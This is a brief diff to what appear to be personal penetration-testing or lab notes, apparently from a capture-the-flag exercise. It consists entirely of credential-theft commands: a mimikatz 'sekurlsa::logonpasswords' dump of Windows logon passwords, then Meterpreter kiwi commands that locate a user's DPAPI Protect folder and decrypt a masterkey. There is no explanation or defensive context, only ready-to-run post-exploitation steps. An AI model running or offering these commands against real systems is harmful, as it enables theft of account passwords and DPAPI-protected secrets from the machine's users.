@@ -1,2 +1,16 @@
 
 mimikatz '"privilege::debug" "sekurlsa::logonpasswords /user:PleaseSubscribe"'
+
+On Meterpreter ( on google => dpapi harmj0y )
+===============================================
+load kiwi
+kiwi_cmd '"dpapi::"'
+
+cd \users\security\appdata\Roaming\Microsoft\Protect
+
+dir
+
+CREDHIST
+S-1-5-21-XXXXXXX-XXXXXX-XXXXXX-XXXXXXXX-XXX
+
+kiwi_cmd '"dpapi::masterkey /in:\users\security\appdata\Roaming\Microsoft\Protect\S-1-5-21-XXXXXXX-XXXXXX-XXXXXX-XXXXXXXX-XXX\YYYYY-YYYYYY-YYYYYY-YYYYYYY"'
